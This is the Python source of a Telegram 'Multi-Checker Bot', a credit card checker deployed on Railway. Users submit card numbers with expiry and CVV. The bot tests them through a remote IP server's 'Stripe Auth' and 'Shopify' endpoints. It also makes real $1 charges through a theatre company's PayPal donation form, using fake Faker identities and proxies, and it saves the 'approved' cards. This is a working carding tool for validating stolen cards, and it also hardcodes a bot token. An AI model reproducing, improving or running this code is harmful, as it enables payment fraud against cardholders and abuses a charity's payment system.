import os
import asyncio
import base64
import json
import random
import re
import string
import time
import urllib.parse
import urllib.request
from dataclasses import dataclass
from typing import Any, Dict, Optional, Tuple, List
from enum import Enum

import httpx
from faker import Faker
from requests_toolbelt.multipart import MultipartEncoder
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters

# --------------------------
# Configuration for Railway
# --------------------------
TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '8342928418:AAHwiZa1QkaucqTi3zJI75RC7tjs7pfVHr4')
PORT = int(os.environ.get('PORT', 8443))
WEBHOOK_URL = os.environ.get('WEBHOOK_URL', '')

ENDPOINTS = {
    '1': ('Stripe Auth (1$)', 'http://135.148.14.197:5000/stripe1$?cc={card}'),
    '2': ('Stripe Auth (5$)', 'http://135.148.14.197:5000/stripe5$?cc={card}'),
    '3': ('Auto Shopify (1$)', 'http://135.148.14.197:5000/shopify1$?cc={card}')
}

REQUEST_TIMEOUT = 25
POLITE_DELAY = 0.25

# User session management
user_sessions = {}

class CheckerType(Enum):
    STRIPE_SHOPIFY = "stripe_shopify"
    PAYPAL_CVV = "paypal_cvv"

class UserSession:
    def __init__(self, user_id: int):
        self.user_id = user_id
        self.checker_type = None
        self.gateway_choice = None
        self.cards = []
        self.results = []
        self.approved_cards = []
        self.waiting_for_cards = False

# --------------------------
# Stripe/Shopify Checker
# --------------------------
def generate_default_cookie():
    """Generate a harmless default cookie string used automatically."""
    session_id = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
    ga = f'GA1.1.{random.randint(1000000000,9999999999)}.{random.randint(1600000000,1730000000)}'
    return '; '.join([f'sessionid={session_id}', f'_ga={ga}', '_gid=GA1.1.1234567890.1234567890'])

def make_request(url, cookie_header=None, timeout=REQUEST_TIMEOUT):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
        'Referer': 'https://www.google.com/'
    }
    if cookie_header:
        headers['Cookie'] = cookie_header
    else:
        headers['Cookie'] = generate_default_cookie()

    try:
        req = urllib.request.Request(url, headers=headers)
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            raw = resp.read()
            try:
                body = raw.decode('utf-8', errors='replace')
            except Exception:
                body = raw.decode('latin-1', errors='replace')
            return {'status': resp.getcode(), 'headers': dict(resp.getheaders()), 'body': body}
    except Exception as e:
        return {'error': str(e)}

def normalize_and_split_input(lines):
    """Normalize and split card input."""
    cards = []
    for line in lines:
        if not line:
            continue
        if ',' in line or ';' in line:
            for part in re.split(r'[;,]+', line):
                part = part.strip()
                if part:
                    cards.append(part)
            continue

        tokens = line.strip().split()
        if len(tokens) > 1:
            for t in tokens:
                t = t.strip()
                if '|' in t or re.match(r'^\d{13,19}$', t):
                    cards.append(t)
                else:
                    cards.append(t)
            continue

        cards.append(line.strip())
    
    seen = set()
    out = []
    for c in cards:
        if not c:
            continue
        if c in seen:
            continue
        seen.add(c)
        out.append(c)
    return out

def parse_and_format_response(info, gateway_name, card):
    out = []
    structured = {'card': card, 'gateway': gateway_name, 'http_status': None, 'parsed': None, 'raw_body': None, 'extra': {}, 'status': 'UNKNOWN'}

    if 'error' in info:
        out.append("❌ Request error: " + info['error'])
        structured['status'] = 'ERROR'
        return '\n'.join(out), structured

    structured['http_status'] = info.get('status')
    body = info.get('body', '')
    structured['raw_body'] = body

    parsed = None
    try:
        parsed = json.loads(body)
        structured['parsed'] = parsed
    except Exception:
        parsed = None

    status_val = None
    message_val = None

    if isinstance(parsed, dict) and 'response' in parsed:
        inner = parsed['response']
        if isinstance(inner, str):
            try:
                inner_obj = json.loads(inner)
            except Exception:
                inner_obj = {'raw_response_field': inner}
        else:
            inner_obj = inner
        status_val = inner_obj.get('status') or inner_obj.get('Status') or inner_obj.get('code')
        message_val = inner_obj.get('message') or inner_obj.get('msg') or inner_obj.get('response')
        for k, v in inner_obj.items():
            if k.lower() not in ('status', 'message', 'msg', 'response'):
                structured['extra'][k] = v
    elif isinstance(parsed, dict):
        status_val = parsed.get('status') or parsed.get('Status') or parsed.get('code')
        message_val = parsed.get('message') or parsed.get('msg')
        for k, v in parsed.items():
            if k.lower() not in ('status', 'message', 'msg', 'response'):
                structured['extra'][k] = v
    else:
        message_val = body.strip()

    su = (str(status_val).upper() if status_val else 'UNKNOWN')
    if su in ('APPROVED', 'OK', 'SUCCESS', 'CHARGED', 'CHARGE', 'AUTHORIZED', 'AUTHORISED', 'AUTH'):
        label = '𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅'
        structured['status'] = 'APPROVED'
    elif su in ('DECLINED', 'FAIL', 'ERROR', 'NOT AUTHORIZED', 'NOT_AUTHORIZED', 'NOTAUTHORIZED'):
        label = '𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ❌'
        structured['status'] = 'DECLINED'
    else:
        label = su
        structured['status'] = su

    out.append(label)
    out.append('')
    out.append(f"𝗖𝗖 ⇾ {card}")
    out.append(f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ {gateway_name}")
    out.append(f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {message_val if message_val else '(no message field)'}")

    if structured['http_status'] is not None:
        out.append('')
        out.append(f"HTTP Status: {structured['http_status']}")

    if not structured['parsed'] and not structured['extra']:
        out.append('')
        out.append("Raw body (first 1500 chars):")
        out.append(body[:1500])

    return '\n'.join(out), structured

async def process_stripe_shopify_cards(session: UserSession):
    """Process cards using Stripe/Shopify checker"""
    gateway_name, base_url = ENDPOINTS[session.gateway_choice]
    results = []
    approved_cards = []
    
    for idx, card in enumerate(session.cards, start=1):
        encoded = urllib.parse.quote_plus(card)
        url = base_url.format(card=encoded)
        await asyncio.sleep(POLITE_DELAY)
        info = make_request(url)
        pretty, structured = parse_and_format_response(info, gateway_name, card)
        results.append(structured)
        
        if structured['status'] == 'APPROVED':
            approved_cards.append(structured)
    
    session.results = results
    session.approved_cards = approved_cards
    return results, approved_cards

# --------------------------
# PayPal CVV Checker
# --------------------------
@dataclass(frozen=True)
class _Config:
    base_url: str = "https://atlanticcitytheatrecompany.com"
    donation_path: str = "/donations/donate/"
    ajax_endpoint: str = "/wp-admin/admin-ajax.php"
    proxy_template: Optional[str] = None
    timeout: float = 90.0
    retries: int = 5

class _SessionFactory:
    __slots__ = ("_cfg", "_faker")

    def __init__(self, cfg: _Config, faker: Faker):
        self._cfg = cfg
        self._faker = faker

    async def _probe_proxy(self, proxy: Optional[str]) -> Optional[httpx.AsyncClient]:
        client = httpx.AsyncClient(
            timeout=self._cfg.timeout,
            proxies=proxy,
            transport=httpx.AsyncHTTPTransport(retries=1)
        )
        try:
            resp = await client.get("https://api.ipify.org?format=json", timeout=15)
            resp.raise_for_status()
            return client
        except Exception:
            await client.aclose()
            return None

    async def build(self) -> Optional[httpx.AsyncClient]:
        if not self._cfg.proxy_template:
            return httpx.AsyncClient(timeout=self._cfg.timeout)

        for _ in range(self._cfg.retries):
            client = await self._probe_proxy(self._cfg.proxy_template)
            if client:
                return client
        return None

@dataclass(frozen=True)
class _FormContext:
    hash: str
    prefix: str
    form_id: str
    access_token: str

class _DonationFacade:
    __slots__ = ("_client", "_cfg", "_faker", "_ctx")

    def __init__(self, client: httpx.AsyncClient, cfg: _Config, faker: Faker):
        self._client = client
        self._cfg = cfg
        self._faker = faker
        self._ctx: Optional[_FormContext] = None

    async def _fetch_initial_page(self) -> str:
        url = f"{self._cfg.base_url}{self._cfg.donation_path}"
        resp = await self._client.get(url)
        resp.raise_for_status()
        return resp.text

    def _extract_context(self, html: str) -> _FormContext:
        hash_ = self._re_search(r'name="give-form-hash" value="(.*?)"', html)
        prefix = self._re_search(r'name="give-form-id-prefix" value="(.*?)"', html)
        form_id = self._re_search(r'name="give-form-id" value="(.*?)"', html)
        enc_token = self._re_search(r'"data-client-token":"(.*?)"', html)
        dec = base64.b64decode(enc_token).decode('utf-8')
        access_token = self._re_search(r'"accessToken":"(.*?)"', dec)
        return _FormContext(hash_, prefix, form_id, access_token)

    @staticmethod
    def _re_search(pattern: str, text: str) -> str:
        match = re.search(pattern, text)
        if not match:
            raise ValueError(f"Pattern not found: {pattern}")
        return match.group(1)

    async def _init_context(self) -> None:
        html = await self._fetch_initial_page()
        self._ctx = self._extract_context(html)

    def _generate_profile(self) -> Dict[str, str]:
        first = self._faker.first_name()
        last = self._faker.last_name()
        num = random.randint(100, 999)
        return {
            "first_name": first,
            "last_name": last,
            "email": f"{first.lower()}{last.lower()}{num}@gmail.com",
            "address1": self._faker.street_address(),
            "address2": f"{random.choice(['Apt', 'Unit', 'Suite'])} {random.randint(1, 999)}",
            "city": self._faker.city(),
            "state": self._faker.state_abbr(),
            "zip": self._faker.zipcode(),
            "card_name": f"{first} {last}",
        }

    def _build_base_multipart(self, profile: Dict[str, str], amount: str) -> MultipartEncoder:
        fields = {
            "give-honeypot": "",
            "give-form-id-prefix": self._ctx.prefix,
            "give-form-id": self._ctx.form_id,
            "give-form-title": "",
            "give-current-url": f"{self._cfg.base_url}{self._cfg.donation_path}",
            "give-form-url": f"{self._cfg.base_url}{self._cfg.donation_path}",
            "give-form-minimum": amount,
            "give-form-maximum": "999999.99",
            "give-form-hash": self._ctx.hash,
            "give-price-id": "custom",
            "give-amount": amount,
            "give_stripe_payment_method": "",
            "payment-mode": "paypal-commerce",
            "give_first": profile["first_name"],
            "give_last": profile["last_name"],
            "give_email": profile["email"],
            "give_comment": "",
            "card_name": profile["card_name"],
            "card_exp_month": "",
            "card_exp_year": "",
            "billing_country": "US",
            "card_address": profile["address1"],
            "card_address_2": profile["address2"],
            "card_city": profile["city"],
            "card_state": profile["state"],
            "card_zip": profile["zip"],
            "give-gateway": "paypal-commerce",
        }
        return MultipartEncoder(fields)

    async def _create_order(self, profile: Dict[str, str], amount: str) -> str:
        multipart = self._build_base_multipart(profile, amount)
        resp = await self._client.post(
            f"{self._cfg.base_url}{self._cfg.ajax_endpoint}",
            params={"action": "give_paypal_commerce_create_order"},
            data=multipart.to_string(),
            headers={"Content-Type": multipart.content_type},
        )
        resp.raise_for_status()
        return resp.json()["data"]["id"]

    async def _confirm_payment(self, order_id: str, card: Tuple[str, str, str, str]) -> httpx.Response:
        n, m, y, cvv = card
        y = y[-2:]
        payload = {
            "payment_source": {
                "card": {
                    "number": n,
                    "expiry": f"20{y}-{m.zfill(2)}",
                    "security_code": cvv,
                    "attributes": {"verification": {"method": "SCA_WHEN_REQUIRED"}},
                }
            },
            "application_context": {"vault": False},
        }
        headers = {
            "Authorization": f"Bearer {self._ctx.access_token}",
            "Content-Type": "application/json",
        }
        return await self._client.post(
            f"https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source",
            json=payload,
            headers=headers,
        )

    async def _approve_order(self, order_id: str, profile: Dict[str, str], amount: str) -> Dict[str, Any]:
        multipart = self._build_base_multipart(profile, amount)
        resp = await self._client.post(
            f"{self._cfg.base_url}{self._cfg.ajax_endpoint}",
            params={"action": "give_paypal_commerce_approve_order", "order": order_id},
            data=multipart.to_string(),
            headers={"Content-Type": multipart.content_type},
        )
        resp.raise_for_status()
        return resp.json()

    async def execute(self, raw_card: str, amount: str = "1") -> str:
        if not self._ctx:
            await self._init_context()

        card = tuple(raw_card.split("|"))
        if len(card) != 4:
            return "Invalid Card Format"

        profile = self._generate_profile()
        order_id = await self._create_order(profile, amount)
        await self._confirm_payment(order_id, card)
        result = await self._approve_order(order_id, profile, amount)
        return self._parse_result(result, amount)

    @staticmethod
    def _parse_result(data: Dict[str, Any], amount: str) -> str:
        if data.get("success"):
            return f"Charged - ${amount} !"

        text = str(data)
        if "'data': {'error': ' " in text:
            status = text.split("'data': {'error': ' ")[1].split('.')[0]
        elif "'details': [{'issue': '" in text:
            status = text.split("'details': [{'issue': '")[1].split("'")[0]
        elif "issuer is not certified. " in text:
            status = text.split("issuer is not certified. ")[1].split('.')[0]
        elif "system is unavailable.  " in text:
            status = text.split("system is unavailable. ")[1].split('.')[0]
        elif "C does not match. " in text:
            status = text.split("not match. ")[1].split('.')[0]
        elif "service is not supported. " in text:
            status = text.split("service is not supported. ")[1].split('.')[0]
        elif "'data': {'error': '" in text:
             status = text.split("'data': {'error': '")[1].split('.')[0]
        else:
            status = "Unknown Error"
        sta = status.replace(' ','').replace('_',' ').title()
        return sta

class PayPalCvvProcessor:
    __slots__ = ("_cfg", "_faker", "_session_factory")

    def __init__(self, proxy: Optional[str] = None):
        self._cfg = _Config(proxy_template=proxy)
        self._faker = Faker("en_US")
        self._session_factory = _SessionFactory(self._cfg, self._faker)

    async def _run_single(self, card: str) -> str:
        client = await self._session_factory.build()
        if not client:
            return "Proxy/Session Init Failed"

        facade = _DonationFacade(client, self._cfg, self._faker)
        try:
            return await facade.execute(card)
        except Exception as e:
            return f"Runtime Error: {str(e)[:50]}"
        finally:
            await client.aclose()

    async def process(self, card: str, attempts: int = 3) -> str:
        for attempt in range(1, attempts + 1):
            try:
                return await self._run_single(card)
            except Exception:
                if attempt == attempts:
                    return "Tries Reached Error"
        return "Logic Flow Error"

async def process_paypal_cards(session: UserSession):
    """Process cards using PayPal CVV checker"""
    processor = PayPalCvvProcessor()
    results = []
    approved_cards = []
    
    for idx, card in enumerate(session.cards, start=1):
        result = await processor.process(card)
        
        # Create structured result similar to Stripe/Shopify format
        structured = {
            'card': card,
            'gateway': 'PayPal CVV Checker',
            'status': 'APPROVED' if 'Charged' in result else 'DECLINED',
            'response': result,
            'http_status': None,
            'parsed': None,
            'raw_body': result,
            'extra': {}
        }
        
        results.append(structured)
        if structured['status'] == 'APPROVED':
            approved_cards.append(structured)
    
    session.results = results
    session.approved_cards = approved_cards
    return results, approved_cards

# --------------------------
# Telegram Bot Handlers
# --------------------------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Send welcome message and main menu"""
    user_id = update.effective_user.id
    if user_id not in user_sessions:
        user_sessions[user_id] = UserSession(user_id)
    
    welcome_text = """
🤖 *Welcome to Multi-Checker Bot* 🚀

I can help you check cards using multiple gateways:

🔹 *Stripe/Shopify Checker* - Check cards via Stripe and Shopify gateways
🔹 *PayPal CVV Checker* - Check cards via PayPal gateway

*Available Commands:*
/start - Show this welcome message
/check - Start checking cards
/help - Get help and instructions

*Card Formats:*
• Stripe/Shopify: `card_number` or `card_number|mm|yyyy|cvv`
• PayPal: `card_number|mm|yyyy|cvv`

Click /check to get started! 🎯
    """
    
    keyboard = [
        [InlineKeyboardButton("🎯 Start Checking", callback_data="main_check")],
        [InlineKeyboardButton("ℹ️ Help", callback_data="help")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(welcome_text, parse_mode='Markdown', reply_markup=reply_markup)

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show help information"""
    help_text = """
📖 *Help & Instructions*

*Supported Checkers:*
1. *Stripe/Shopify Checker*
   - Stripe Auth (1$)
   - Stripe Auth (5$) 
   - Auto Shopify (1$)

2. *PayPal CVV Checker*
   - PayPal donation gateway ($1)

*Card Format Examples:*
• For Stripe/Shopify: `4207670279473469` or `4207670279473469|09|2027|381`
• For PayPal: `4207670279473469|09|2027|381`

*How to Use:*
1. Click /check or use the menu
2. Choose checker type
3. Select gateway (if applicable)  
4. Paste your cards (one per line)
5. Send 'done' when finished
6. Wait for results

*Note:* Always ensure you have proper authorization to check any cards.
    """
    
    keyboard = [[InlineKeyboardButton("🔙 Back to Main", callback_data="main_menu")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(help_text, parse_mode='Markdown', reply_markup=reply_markup)

async def check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start the checking process"""
    user_id = update.effective_user.id
    if user_id not in user_sessions:
        user_sessions[user_id] = UserSession(user_id)
    
    session = user_sessions[user_id]
    session.waiting_for_cards = False
    session.cards = []
    session.results = []
    session.approved_cards = []
    
    keyboard = [
        [InlineKeyboardButton("🔹 Stripe/Shopify", callback_data="checker_stripe")],
        [InlineKeyboardButton("🔸 PayPal CVV", callback_data="checker_paypal")],
        [InlineKeyboardButton("🔙 Main Menu", callback_data="main_menu")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "🛠 *Choose Checker Type:*\n\n"
        "🔹 *Stripe/Shopify* - Multiple gateways available\n"
        "🔸 *PayPal CVV* - PayPal donation gateway\n\n"
        "Select one:",
        parse_mode='Markdown',
        reply_markup=reply_markup
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle inline keyboard button presses"""
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    if user_id not in user_sessions:
        user_sessions[user_id] = UserSession(user_id)
    
    session = user_sessions[user_id]
    data = query.data
    
    if data == "main_menu":
        await start(query, context)
        return
        
    elif data == "main_check":
        await check_command(query, context)
        return
        
    elif data == "help":
        await help_command(query, context)
        return
        
    elif data == "checker_stripe":
        session.checker_type = CheckerType.STRIPE_SHOPIFY
        keyboard = [
            [InlineKeyboardButton("Stripe 1$", callback_data="gateway_1")],
            [InlineKeyboardButton("Stripe 5$", callback_data="gateway_2")],
            [InlineKeyboardButton("Shopify 1$", callback_data="gateway_3")],
            [InlineKeyboardButton("🔙 Back", callback_data="main_check")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            "🔹 *Stripe/Shopify Checker*\n\nSelect Gateway:",
            parse_mode='Markdown',
            reply_markup=reply_markup
        )
        
    elif data == "checker_paypal":
        session.checker_type = CheckerType.PAYPAL_CVV
        session.gateway_choice = None
        await query.edit_message_text(
            "🔸 *PayPal CVV Checker*\n\n"
            "Please paste your cards in the format:\n"
            "`card_number|mm|yyyy|cvv`\n\n"
            "*Example:*\n"
            "`4207670279473469|09|2027|381`\n\n"
            "Send one card per line. Send 'done' when finished.",
            parse_mode='Markdown'
        )
        session.waiting_for_cards = True
        
    elif data.startswith("gateway_"):
        gateway_num = data.split("_")[1]
        session.gateway_choice = gateway_num
        gateway_name = ENDPOINTS[gateway_num][0]
        
        await query.edit_message_text(
            f"🔹 *{gateway_name}*\n\n"
            "Please paste your cards. Supported formats:\n"
            "• `card_number`\n"
            "• `card_number|mm|yyyy|cvv`\n\n"
            "*Examples:*\n"
            "`4207670279473469`\n"
            "`4207670279473469|09|2027|381`\n\n"
            "Send one card per line. Send 'done' when finished.",
            parse_mode='Markdown'
        )
        session.waiting_for_cards = True
        
    elif data == "save_approved":
        await save_approved_cards(update, context)

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle user messages for card input"""
    user_id = update.effective_user.id
    if user_id not in user_sessions:
        user_sessions[user_id] = UserSession(user_id)
    
    session = user_sessions[user_id]
    message_text = update.message.text.strip()
    
    if not session.waiting_for_cards:
        await update.message.reply_text(
            "Please use /check to start checking cards or /help for instructions."
        )
        return
    
    if message_text.lower() == 'done':
        if not session.cards:
            await update.message.reply_text("No cards provided. Use /check to try again.")
            session.waiting_for_cards = False
            return
            
        # Process cards
        processing_msg = await update.message.reply_text(
            f"🔄 Processing {len(session.cards)} card(s)... Please wait."
        )
        
        try:
            if session.checker_type == CheckerType.STRIPE_SHOPIFY:
                results, approved = await process_stripe_shopify_cards(session)
            else:  # PAYPAL_CVV
                results, approved = await process_paypal_cards(session)
            
            # Format results
            result_text = format_results(session, results, approved)
            
            # Send results in chunks if too long
            if len(result_text) > 4000:
                chunks = [result_text[i:i+4000] for i in range(0, len(result_text), 4000)]
                for chunk in chunks:
                    await update.message.reply_text(chunk, parse_mode='Markdown')
            else:
                await update.message.reply_text(result_text, parse_mode='Markdown')
                
            # Offer to save approved cards
            if approved:
                keyboard = [
                    [InlineKeyboardButton("💾 Save Approved Cards", callback_data="save_approved")],
                    [InlineKeyboardButton("🔄 Check More", callback_data="main_check")]
                ]
                reply_markup = InlineKeyboardMarkup(keyboard)
                await update.message.reply_text(
                    f"✅ Found {len(approved)} approved card(s)!",
                    reply_markup=reply_markup
                )
            else:
                keyboard = [[InlineKeyboardButton("🔄 Check More", callback_data="main_check")]]
                reply_markup = InlineKeyboardMarkup(keyboard)
                await update.message.reply_text(
                    "❌ No approved cards found.",
                    reply_markup=reply_markup
                )
                
        except Exception as e:
            await update.message.reply_text(f"❌ Error processing cards: {str(e)}")
            
        session.waiting_for_cards = False
        
    else:
        # Add card to session
        session.cards.append(message_text)
        await update.message.reply_text(
            f"✅ Card added ({len(session.cards)} total). Send more cards or 'done' to start checking."
        )

async def save_approved_cards(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Save approved cards to a file"""
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    if user_id not in user_sessions:
        await query.edit_message_text("Session expired. Please start again with /check")
        return
        
    session = user_sessions[user_id]
    
    if not session.approved_cards:
        await query.edit_message_text("No approved cards to save.")
        return
        
    try:
        timestamp = int(time.time())
        filename = f"approved_cards_{user_id}_{timestamp}.json"
        
        save_data = {
            'checker_type': session.checker_type.value if session.checker_type else 'unknown',
            'gateway': session.gateway_choice,
            'timestamp': timestamp,
            'approved_cards': session.approved_cards
        }
        
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(save_data, f, indent=2, ensure_ascii=False)
        
        await query.edit_message_text(f"✅ Approved cards saved to `{filename}`")
        
    except Exception as e:
        await query.edit_message_text(f"❌ Error saving file: {str(e)}")

def format_results(session: UserSession, results: List[Dict], approved_cards: List[Dict]) -> str:
    """Format results for display"""
    checker_name = "Stripe/Shopify" if session.checker_type == CheckerType.STRIPE_SHOPIFY else "PayPal CVV"
    gateway_name = ENDPOINTS.get(session.gateway_choice, ['Unknown'])[0] if session.gateway_choice else "PayPal"
    
    result_text = f"""
📊 *Check Results*

*Checker:* {checker_name}
*Gateway:* {gateway_name}
*Total Cards:* {len(results)}
*Approved:* {len(approved_cards)}
*Declined:* {len(results) - len(approved_cards)}

────────────────────
    """
    
    for i, result in enumerate(results, 1):
        status_icon = "✅" if result['status'] == 'APPROVED' else "❌"
        result_text += f"\n{status_icon} *Card {i}:* `{result['card']}`\n"
        result_text += f"*Status:* {result['status']}\n"
        result_text += f"*Response:* {result.get('response', 'N/A')}\n"
        
        if result.get('http_status'):
            result_text += f"*HTTP Status:* {result['http_status']}\n"
            
        result_text += "─" * 20 + "\n"
    
    return result_text

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle errors"""
    print(f"Update {update} caused error {context.error}")
    if update and update.effective_message:
        await update.effective_message.reply_text(
            "❌ An error occurred. Please try again or use /help for assistance."
        )

# --------------------------
# Railway Deployment Setup
# --------------------------
async def set_webhook(application: Application):
    """Set webhook for Railway"""
    if WEBHOOK_URL:
        webhook_url = f"{WEBHOOK_URL}/{TELEGRAM_BOT_TOKEN}"
        await application.bot.set_webhook(webhook_url)
        print(f"Webhook set to: {webhook_url}")
    else:
        print("No WEBHOOK_URL set, using polling")

def main():
    """Start the bot for Railway"""
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    
    # Add handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("check", check_command))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CallbackQueryHandler(button_handler))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    application.add_error_handler(error_handler)
    
    # Railway deployment
    if WEBHOOK_URL:
        # Webhook mode for Railway
        print("🚂 Starting in Railway webhook mode...")
        application.run_webhook(
            listen="0.0.0.0",
            port=PORT,
            url_path=TELEGRAM_BOT_TOKEN,
            webhook_url=f"{WEBHOOK_URL}/{TELEGRAM_BOT_TOKEN}"
        )
    else:
        # Polling mode for local development
        print("🖥️ Starting in polling mode...")
        application.run_polling()

if __name__ == "__main__":
    main()